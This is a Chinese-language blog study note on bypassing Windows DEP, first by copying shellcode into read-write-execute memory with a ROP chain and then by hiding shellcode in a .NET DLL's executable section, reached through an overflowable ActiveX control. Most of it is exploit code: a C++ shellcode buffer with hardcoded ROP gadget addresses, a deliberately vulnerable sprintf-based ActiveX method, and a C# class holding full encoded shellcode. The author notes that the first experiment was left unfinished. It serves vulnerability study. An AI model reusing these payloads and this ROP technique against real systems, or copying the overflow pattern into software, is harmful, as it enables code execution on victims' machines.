---
title: 漏洞学习笔记-016-利用可执行内存和.NET攻击DEP
description: Ret2Libc之利用VirtualProtect和VirtualAlloc攻击DEP攻击DEP
date: 2020-11-20 14:13:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-016-利用可执行内存和.net攻击dep/)

## 利用可执行内存攻击DEP

### 原理

- 有的时候在进程的内存空间中会存在一段可读可写可执行的内存，如果我们能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会

### 代码

```cpp
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"......"
"\x90\x90\x90\x90"
"\x8A\x17\x84\x7C"//pop eax retn
"\x0B\x1A\xBF\x7C"//pop pop retn
"\xBA\xD9\xBB\x7C"//修正EBP retn 4
"\x5F\x78\xA6\x7C"//pop retn
"\x08\x00\x14\x00"//可执行内存中弹出对话框机器码的起始地址
"\x00\x00\x14\x00"//可执行内存空间地址，复制用
"\xBF\x7D\xC9\x77"//push esp jmp eax && 原始 shellcode 起始地址
"\xFF\x00\x00\x00"//shellcode 长度
"\xAC\xAF\x94\x7C"//memcpy
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"......"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
;

void test()
{
    char tt[176];
    memcpy(tt, shellcode, 450);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();

    return 0;
}
```

### 后记

- 按理来说是要有RWE权限的内存区域的，可惜么得，此实验未完成

## 利用.NET攻击DEP

### 原理

- .NET 的文件具有和与PE文件一样的结构，也就是说它也具有.text等段，这些段也会被映射到内存中，也会具备一定的可执行属性。大家应该想到如何利用这一点了，将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了
- 需求
  - 具有溢出漏洞的ActiveX控件
  - 包含有shellcode的.NET控件
  - 可以触发ActiveX控件中溢出漏洞的POC页面

### 代码

> 具有溢出漏洞的ActiveX控件

```cpp
void CVulnerAXCtrl::test(LPCTSTR str)
{
    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
    // TODO: Add your dispatch handler code here
    printf("aaaa"); // 定位该函数的标记
    char dest[100];
    sprintf(dest, "%s", str);
}
```

> 包含有shellcode的.NET控件

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DEP_NETDLL
{
    public class Class1
    {
        public void Shellcode()
        {
            string shellcode =
            "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
            "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
            "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
            "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
            "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
            "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
            "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
            "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
            "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
            "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
            "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
            "\uff53\ufc57\uff53\uf857"
            ;
        }
    }
}
```

## 利用Java Applet挑战DEP

> 难以找到适合的版本，所以此实验略过，以后有机会再补充
